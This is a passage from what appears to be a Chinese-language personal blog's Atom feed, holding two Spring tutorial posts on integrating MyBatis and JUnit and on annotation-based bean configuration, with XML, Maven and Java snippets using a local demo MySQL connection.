    <content type="html"><![CDATA[<h1 id="整合Mybatis"><a href="#整合Mybatis" class="headerlink" title="整合Mybatis"></a>整合Mybatis</h1><h2 id="加载properties文件-XML"><a href="#加载properties文件-XML" class="headerlink" title="加载properties文件(XML)"></a>加载properties文件(XML)</h2><h3 id="1-开启context命名空间"><a href="#1-开启context命名空间" class="headerlink" title="1.开启context命名空间"></a>1.开启context命名空间</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">  http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">  http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">  http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">  http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-使用contxt命名空间加载指定properties文件"><a href="#2-使用contxt命名空间加载指定properties文件" class="headerlink" title="2.使用contxt命名空间加载指定properties文件"></a>2.使用contxt命名空间加载指定properties文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath*:*.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="加载格式"><a href="#加载格式" class="headerlink" title="加载格式"></a>加载格式</h4><blockquote><p>不加载系统属性</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;jdbc.properties&quot;</span> <span class="attr">system-properties-mode</span>=<span class="string">&quot;NEVER&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>加载多个properties文件</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;jdbc.properties,msg.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>加载所有properties文件</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;*.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>加载所有properties文件<strong>标准格式</strong></p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:*.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>从类路径或jar包中搜索并加载properties文件</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath*:*.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="加载properties文件-注解"><a href="#加载properties文件-注解" class="headerlink" title="加载properties文件(注解)"></a>加载properties文件(注解)</h2><p>注解开发只需要在配置类中添加注解@PropertySource(“classpath:jdbc.properties”)扫描包即可</p><blockquote><p>引用方式如下</p></blockquote><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jdbc.driver</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">jdbc.url</span>=<span class="string">jdbc:mysql://localhost:3306/testgeneration?useSSL=false&amp;amp;allowPublicKeyRetrieval=true&amp;amp;serverTimezone=UTC</span></span><br><span class="line"><span class="attr">jdbc.userName</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">jdbc.password</span>=<span class="string">1234</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;$&#123;jdbc.driver&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String driver;</span><br><span class="line"><span class="meta">@Value(&quot;$&#123;jdbc.url&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String url;</span><br><span class="line"><span class="meta">@Value(&quot;$&#123;jdbc.userName&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String userName;</span><br><span class="line"><span class="meta">@Value(&quot;$&#123;jdbc.password&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String password;</span><br></pre></td></tr></table></figure><h2 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="配置Mybatis配置类"><a href="#配置Mybatis配置类" class="headerlink" title="配置Mybatis配置类"></a>配置Mybatis配置类</h2><p>在没有用Spring之前使用mybatis的方式是需要两个步骤的<br>1.写一个配置文件<strong>mybatis-config.xml</strong><br>2.每次使用的时候调用SqlSessionFactory创建sqlSession对象然后再通过sqlSession获取对应的Mapper<br>在使用Spring之后，以上步骤全部简化为一个配置类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//设置别名</span><br><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.version2.pojo&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">//environments:配置数据库连接环境信息，可以配置多个environment。通过default属性切换不同的environment</span><br><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">            //数据库连接信息</span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/testgeneration?useSSL=false<span class="symbol">&amp;amp;</span>allowPublicKeyRetrieval=true<span class="symbol">&amp;amp;</span>serverTimezone=UTC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1234&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转变为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SqlSessionFactoryBean <span class="title function_">sqlSessionFactory</span><span class="params">(DataSource dataSource)</span>&#123;</span><br><span class="line">  <span class="type">SqlSessionFactoryBean</span> <span class="variable">sqlSessionFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBean</span>();</span><br><span class="line">  sqlSessionFactoryBean.setTypeAliasesPackage(<span class="string">&quot;com.Learning2.domain&quot;</span>);</span><br><span class="line">  sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">  <span class="keyword">return</span> sqlSessionFactoryBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Mapper代理方式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.version2.mapper&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转变为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> MapperScannerConfigurer <span class="title function_">mapperScannerConfigurer</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">MapperScannerConfigurer</span> <span class="variable">mapperScannerConfigurer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MapperScannerConfigurer</span>();</span><br><span class="line">  mapperScannerConfigurer.setBasePackage(<span class="string">&quot;com.Learning2.dao&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> mapperScannerConfigurer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在Service里面即可直接获取Dao的代理对象进行数据库的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">UserServiceImpl</span><span class="params">(UserDao userDao)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(User user)</span>&#123;</span><br><span class="line">    userDao.save(user);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> userDao.findAll();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> User <span class="title function_">findByAccount</span><span class="params">(String account)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> userDao.findByAccount(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="整合JUnit"><a href="#整合JUnit" class="headerlink" title="整合JUnit"></a>整合JUnit</h1><h2 id="引入依赖-1"><a href="#引入依赖-1" class="headerlink" title="引入依赖"></a>引入依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(classes = SpringConfig.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceTest</span> &#123;</span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line">  <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findByAccountTest</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(userService.findByAccount(<span class="string">&quot;张三&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;整合Mybatis&quot;&gt;&lt;a href=&quot;#整合Mybatis&quot; class=&quot;headerlink&quot; title=&quot;整合Mybatis&quot;&gt;&lt;/a&gt;整合Mybatis&lt;/h1&gt;&lt;h2 id=&quot;加载properties文件-XML&quot;&gt;&lt;a href=&quot;#加载prope</summary>
      
    
    
    
    <category term="Spring" scheme="https://kallenblue.github.io/categories/Spring/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring/注解开发</title>
    <link href="https://kallenblue.github.io/2022/09/29/Spring/Spring-%E6%B3%A8%E8%A7%A3%E5%BC%80%E5%8F%91/"/>
    <id>https://kallenblue.github.io/2022/09/29/Spring/Spring-%E6%B3%A8%E8%A7%A3%E5%BC%80%E5%8F%91/</id>
    <published>2022-09-29T13:30:36.000Z</published>
    <updated>2022-10-02T08:47:40.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="注解开发"><a href="#注解开发" class="headerlink" title="注解开发"></a>注解开发</h1><h2 id="注解开发定义Bean"><a href="#注解开发定义Bean" class="headerlink" title="注解开发定义Bean"></a>注解开发定义Bean</h2><p>一般的注解为 <strong>@Component</strong><br>附有三个衍生注解<br><strong>@Controller</strong>：用于表现层Bean定义<br><strong>@Service</strong>：用于业务层Bean定义<br><strong>@Repository</strong>：用于数据层Bean定义</p><h2 id="注解开发管理第三方Bean"><a href="#注解开发管理第三方Bean" class="headerlink" title="注解开发管理第三方Bean"></a>注解开发管理第三方Bean</h2><blockquote><p>在另一个类中编写返回值为第三方类的对象的方法，并添加@Bean注解</p></blockquote><p>在另一个类中编写是为了和配置类分开，避免将来Bean多了之后，配置类混乱的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcConfig</span> &#123;</span><br><span class="line">  <span class="meta">@Bean</span></span><br><span class="line">  <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">DruidDataSource</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">    ds.setDriverClassName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    ds.setUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/testgeneration?useSSL=false&amp;amp;allowPublicKeyRetrieval=true&amp;amp;serverTimezone=UTC&quot;</span>);</span><br><span class="line">    ds.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    ds.setPassword(<span class="string">&quot;1234&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ds;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>使用@Import注解手动加入配置类到核心配置，多个数据用数组格式</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Import(&#123;JdbcConfig.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注解开发为第三方Bean注入资源"><a href="#注解开发为第三方Bean注入资源" class="headerlink" title="注解开发为第三方Bean注入资源"></a>注解开发为第三方Bean注入资源</h2><h3 id="简单类型依赖注入"><a href="#简单类型依赖注入" class="headerlink" title="简单类型依赖注入"></a>简单类型依赖注入</h3><blockquote><p>直接在变量里加上@Value注解</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcConfig</span> &#123;</span><br><span class="line">  <span class="meta">@Value(&quot;com.mysql.cj.jdbc.Driver&quot;)</span></span><br><span class="line">  <span class="keyword">private</span> String driver;</span><br><span class="line">  <span class="meta">@Value(&quot;jdbc:mysql://localhost:3306/testgeneration?useSSL=false&amp;amp;allowPublicKeyRetrieval=true&amp;amp;serverTimezone=UTC&quot;)</span></span><br><span class="line">  <span class="keyword">private</span> String url;</span><br><span class="line">  <span class="meta">@Value(&quot;root&quot;)</span></span><br><span class="line">  <span class="keyword">private</span> String userName;</span><br><span class="line">  <span class="meta">@Value(&quot;1234&quot;)</span></span><br><span class="line">  <span class="keyword">private</span> String password;</span><br><span class="line">  <span class="meta">@Bean</span></span><br><span class="line">  <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">DruidDataSource</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">    ds.setDriverClassName(driver);</span><br><span class="line">    ds.setUrl(url);</span><br><span class="line">    ds.setUsername(userName);</span><br><span class="line">    ds.setPassword(password);</span><br><span class="line">    <span class="keyword">return</span> ds;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="引用类型注入"><a href="#引用类型注入" class="headerlink" title="引用类型注入"></a>引用类型注入</h3><blockquote><p>只需要为bean定义方法设置形参即可，容器会根据类型自动装配对象</p></blockquote><p>注册为容器中的Bean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@org</span>.springframework.stereotype.Service</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Service</span> <span class="keyword">implements</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Service test&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@ComponentScan扫描路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.Learning1.service&quot;)</span></span><br><span class="line"><span class="meta">@Import(&#123;JdbcConfig.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自动装配对象service</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">(Service service)</span>&#123;</span><br><span class="line">  System.out.println(service);</span><br><span class="line">  <span class="type">DruidDataSource</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">  ds.setDriverClassName(driver);</span><br><span class="line">  ds.setUrl(url);</span><br><span class="line">  ds.setUsername(userName);</span><br><span class="line">  ds.setPassword(password);</span><br><span class="line">  <span class="keyword">return</span> ds;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;注解开发&quot;&gt;&lt;a href=&quot;#注解开发&quot; class=&quot;headerlink&quot; title=&quot;注解开发&quot;&gt;&lt;/a&gt;注解开发&lt;/h1&gt;&lt;h2 id=&quot;注解开发定义Bean&quot;&gt;&lt;a href=&quot;#注解开发定义Bean&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
